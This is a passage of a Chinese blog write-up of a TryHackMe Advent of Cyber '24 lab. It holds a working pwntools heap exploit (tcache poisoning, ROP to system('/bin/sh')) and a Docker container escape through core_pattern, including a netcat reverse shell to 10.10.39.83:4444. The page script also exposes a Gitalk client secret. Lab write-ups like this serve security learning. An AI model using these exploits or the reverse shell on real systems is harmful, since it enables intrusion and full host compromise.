class="built_in">hex</span>(vuln_tcache))</span><br><span class="line">target = predicted_main_ret - <span class="number">0x8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;target: &quot;</span> + <span class="built_in">hex</span>(target))</span><br><span class="line">safe_link_addr = target ^ (vuln_tcache &gt;&gt; <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># load in the target</span></span><br><span class="line">payload = <span class="string">b&quot;sixthlargechunk&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;D&quot;</span>*(<span class="number">0xbd8</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += p64(<span class="number">0x401</span>) <span class="comment"># 0x20 smaller than 0x420</span></span><br><span class="line">payload += p64(safe_link_addr)</span><br><span class="line">edit(<span class="number">9</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># allocate out of the tcache bin, corrupting it</span></span><br><span class="line">create(<span class="number">11</span>, <span class="number">0x3f0</span>, <span class="string">b&quot;removefirsttcache&quot;</span>) <span class="comment"># 0x10 (16 bytes) smaller than the tcache bin.</span></span><br><span class="line"><span class="comment"># this will be at our target location</span></span><br><span class="line"></span><br><span class="line">ret = p64(libc_base + <span class="number">0x1afc8c</span>) <span class="comment"># objdump -d libc.so.6 | grep ret</span></span><br><span class="line">poprdiret = p64(libc_base + <span class="number">0x10f75b</span>) <span class="comment"># ROPgadget --binary libc.so.6 | grep &#x27;pop rdi&#x27;</span></span><br><span class="line">system = p64(libc.symbols[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">binsh = p64(libc_base + <span class="number">0x1cb42f</span>) <span class="comment"># strings -a -t x libc.so.6 | grep /bin/sh</span></span><br><span class="line">final_payload = p64(<span class="number">0</span>) + ret + poprdiret + binsh + system + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">12</span>, <span class="number">0x3f0</span>, final_payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>) <span class="comment"># exit main to trigger exploit</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>  <img src="https://pic1.imgdb.cn/item/6794a945d0e0a243d4f7ce9b.png" alt=""></p>
+</li>
+<li><p><code>docker</code> 逃逸</p>
+<ul>
+<li><p>不逃逸的懒狗办法</p>
+<p>  这里引入一个很厉害的工具 <a target="_blank" rel="noopener" href="https://github.com/cdk-team/CDK">cdk</a></p>
+<p>  其存在一个很超模的功能：从主机读取任意文件：</p>
+<p>  <img src="https://pic1.imgdb.cn/item/6794abe1d0e0a243d4f7d044.png" alt=""></p>
+<p>  <img src="https://pic1.imgdb.cn/item/6794ac07d0e0a243d4f7d050.png" alt=""></p>
+</li>
+<li><p><code>core_pattern</code> 核心模式突破</p>
+<ul>
+<li><p>前置-管道符 <code>|</code></p>
+<p>  在核心模式突破中，管道符告诉内核，在生成核心转储时，不将转储数据写入文件，而将数据传递给管道符后面的指定程序并交由该程序处理</p>
+<p>  通常情况下， <code>/proc/sys/kernel/core_pattern</code> 用来指定程序崩溃后核心转储文件的存储路径：</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/tmp/core.%e.%p&#x27;</span> &gt; /proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>
+<p>  此将核心转储文件保存到 <code>/tmp</code> 下，包含崩溃的程序名 <code>%e</code> 和进程id <code>%p</code></p>
+<p>  但当路径以管道符 <code>|</code> 作为前缀时，内核不再将核心转储数据写入文件，而将其作为输入传递给指定程序，即该指定程序可在任何程序崩溃时由内核调用并执行</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;|/usr/bin/process_core&quot;</span> &gt; /proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>
+<p>  即某程序崩溃后核心转储数据被传递给 <code>/usr/bin/process_core</code> ，后者对数据做进一步处理</p>
+<p>  而在 <code>docker</code> 逃逸中，利用这一机制将管道符后的程序路径设为自定义的恶意脚本：</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;|/var/lib/docker/overlay2/.../diff/shell.sh&quot;</span> &gt; /proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>
+<p>  此时某一程序崩溃后会由内核执行 <code>shell.sh</code> 脚本，而由于 <code>core_pattern</code> 是主机内核的配置项，那么该脚本将会在主机上运行从而实现逃逸</p>
+<p>传 <code>linpeas</code> 看到：</p>
+<p><img src="https://pic1.imgdb.cn/item/6794ad8cd0e0a243d4f7d0e5.png" alt=""></p>
+<p>在这种情况下，利用了容器化环境中 <code>core_pattern</code> 内核参数配置错误来实现逃逸。此时主机系统被配置为以某种方式存储或处理核心转储，从而暴露敏感数据或允许容器与主机交互。</p>
+<p>条件为：</p>
+</li>
+<li><p>容器以特权模式运行或具有 <code>CAP_SYS_ADMIN</code> 来修改 <code>/proc/sys/kernel/core_pattern</code></p>
+</li>
+<li>可访问主机目录的写入权限</li>
+<li><p><code>core_pattern</code> 配置不安全或可被容器覆盖</p>
+<p>首先测试下是否可以模拟崩溃：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/tmp/core.%e.%p&#x27;</span> &gt; /proc/sys/kernel/core_pattern</span><br><span class="line">python3 -c <span class="string">&#x27;import os; os.abort()&#x27;</span></span><br><span class="line">ls /tmp</span><br></pre></td></tr></table></figure>
+<p><img src="https://pic1.imgdb.cn/item/6794b156d0e0a243d4f7d27a.png" alt=""></p>
+<p>然后就是脚本编写，为了能从主机被访问到，需要找到挂载点与覆盖文件夹：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount</span><br></pre></td></tr></table></figure>
+<p><img src="https://pic1.imgdb.cn/item/6794b1a2d0e0a243d4f7d2a3.png" alt=""></p>
+<p>即容器上的 <code>/</code> 实际位于主机上的 <code>/var/lib/docker/overlay2/221c28c3554db6a8781a1558e327ee54b8a3d6b7266507ee7ccd8af24a05c444/diff</code></p>
+<p>在 <code>/</code> 目录下写一个反弹 <code>shell</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/bash&#x27;</span> &gt; /shell.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.39.83 4444 &gt;/tmp/f&#x27;</span> &gt;&gt; /shell.sh</span><br><span class="line">chmod +x /shell.sh</span><br></pre></td></tr></table></figure>
+<p>然后加上管道符和在主机上的完全路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;|/var/lib/docker/overlay2/221c28c3554db6a8781a1558e327ee54b8a3d6b7266507ee7ccd8af24a05c444/diff/shell.sh&quot; &gt; /proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>
+<p>然后强制崩溃，在此之前攻击机开监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import os; os.abort()&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://pic1.imgdb.cn/item/6794b307d0e0a243d4f7d36d.png" alt=""></p>
+<p><img src="https://pic1.imgdb.cn/item/6794b345d0e0a243d4f7d38c.png" alt=""></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>noone___
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://noone40404.github.io/2025/01/25/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8462%EF%BC%9AAdvent%20of%20Cyber%20'24%20Side%20QuestT3/" title="THM打靶日寄62-Advent of Cyber &#39;24：支线T3丑陋复现">http://noone40404.github.io/2025/01/25/THM打靶日寄62：Advent of Cyber '24 Side QuestT3/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/THM/" rel="tag"><i class="fa fa-tag"></i> THM</a>
+              <a href="/tags/Advent-of-Cyber-2024/" rel="tag"><i class="fa fa-tag"></i> Advent of Cyber 2024</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/01/24/THM%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%8461%EF%BC%9AAdvent%20of%20Cyber%20'24%20Side%20QuestT2/" rel="prev" title="THM打靶日寄61-Advent of Cyber '24：支线T2丑陋复现">
+      <i class="fa fa-chevron-left"></i> THM打靶日寄61-Advent of Cyber '24：支线T2丑陋复现
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/01/31/Thunder%E7%BB%BC%E5%90%88%E5%86%85%E7%BD%91%E6%89%93%E9%9D%B6%E6%97%A5%E5%AF%84/" rel="next" title="Thunder综合内网打靶日寄">
+      Thunder综合内网打靶日寄 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="noone___"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">noone___</p>
+  <div class="site-description" itemprop="description">自闭中</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">196</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">81</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/noone40404" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;noone40404" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友链
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://ctp314.github.io/" title="https:&#x2F;&#x2F;ctp314.github.io&#x2F;" rel="noopener" target="_blank">CTime_Pup_314</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/guanlexiangfan/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;guanlexiangfan&#x2F;" rel="noopener" target="_blank">Evitagen</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.luogu.com.cn/blog/i-am-zhiyangfan/" title="https:&#x2F;&#x2F;www.luogu.com.cn&#x2F;blog&#x2F;i-am-zhiyangfan&#x2F;" rel="noopener" target="_blank">zhiyangfan</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/Vitheon/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;Vitheon&#x2F;" rel="noopener" target="_blank">Vareal</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">noone___</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+  <script data-pjax>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'ebdb5b537395179b4514',
+      clientSecret: 'd0843e5853efe963ca9983db6cac3a1f9d736856',
+      repo        : 'noone40404.github.io',
+      owner       : 'noone40404',
+      admin       : ['noone40404'],
+      id          : '45e7add3ed76e646e9016f63a100c524',
+        language: 'zn-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+    </div>
+</body>
+</html>
